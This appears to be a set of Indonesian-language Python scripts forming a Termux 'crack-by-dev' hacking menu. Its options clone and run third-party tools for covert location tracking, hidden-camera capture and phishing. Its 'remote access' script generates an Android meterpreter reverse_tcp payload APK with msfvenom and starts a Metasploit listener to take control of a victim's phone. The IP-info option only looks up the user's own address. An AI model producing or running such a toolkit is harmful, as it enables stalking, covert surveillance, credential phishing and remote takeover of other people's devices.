import os

def menu():
    os.system("clear")
    print("=== crack-by-dev ===")
    print("[1] Lacak Lokasi")
    print("[2] Kamera Tersembunyi")
    print("[3] Phishing")
    print("[4] Info IP Target")
    print("[5] Remote Akses")
    print("[0] Keluar")
    choice = input("Pilih opsi: ")
    if choice == "1":
        os.system("python tools/location.py")
    elif choice == "2":
        os.system("python tools/camera.py")
    elif choice == "3":
        os.system("python tools/phishing.py")
    elif choice == "4":
        os.system("python tools/ip_info.py")
    elif choice == "5":
        os.system("python tools/remote.py")
    else:
        exit()

if __name__ == "__main__":
    while True:
        menu()
import os

print("Menyiapkan pelacak lokasi...")
os.system("pkg install -y php curl openssh git")
os.system("git clone https://github.com/thewhiteh4t/seeker tools/seeker")
os.chdir("tools/seeker")
os.system("chmod +x install.sh && bash install.sh")
os.system("python seeker.py")
import os

print("Menyiapkan kamera tersembunyi...")
os.system("pkg install -y php curl openssh git")
os.system("git clone https://github.com/technicaldada/hack-cam tools/hack-cam")
os.chdir("tools/hack-cam")
os.system("bash hack-cam.sh")
import os

print("Menyiapkan phishing tools...")
os.system("pkg install -y php curl git")
os.system("git clone https://github.com/htr-tech/zphisher tools/zphisher")
os.chdir("tools/zphisher")
os.system("bash zphisher.sh")
import requests

ip = requests.get("https://api.ipify.org").text
info = requests.get(f"https://ip-api.com/json/{ip}").json()

print(f"IP Kamu: {ip}")
print(f"Lokasi: {info.get('city')}, {info.get('regionName')} - {info.get('country')}")
print(f"ISP: {info.get('isp')}")
print(f"Koordinat: {info.get('lat')}, {info.get('lon')}")
import os

print("Menyiapkan akses jarak jauh...")
print("Membuat payload dan memulai listener...")
os.system("pkg install -y metasploit")
os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST=0.0.0.0 LPORT=4444 -o payload.apk")
print("Payload disimpan sebagai payload.apk")
print("Menjalankan Metasploit...")
os.system("msfconsole -x 'use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit'")
